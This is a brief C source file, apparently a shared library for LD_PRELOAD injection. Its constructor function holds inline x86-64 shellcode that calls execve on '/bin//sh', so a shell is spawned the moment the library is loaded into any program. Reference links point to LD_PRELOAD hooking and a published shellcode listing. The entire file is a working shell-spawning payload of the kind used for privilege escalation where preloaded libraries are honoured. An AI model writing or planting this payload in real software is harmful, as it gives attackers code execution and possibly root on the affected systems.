#define _GNU_SOURCE

__attribute__((constructor)) static void set(void) {

    __asm__ volatile (" \
        xor    %rsi,%rsi \n\
        push   %rsi \n\
        movabs $0x68732f2f6e69622f,%rdi \n\
        push   %rdi \n\
        push   %rsp \n\
        pop    %rdi \n\
        pushq  $0x3b \n\
        pop    %rax \n\
        cdq \n\
        syscall \n\
        "
        );
}


/*
References:
- https://tbrindus.ca/correct-ld-preload-hooking-libc/
- https://packetstormsecurity.com/files/153038/Linux-x64-execve-bin-sh-Shellcode.html
- https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#File_header
- http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html
*/
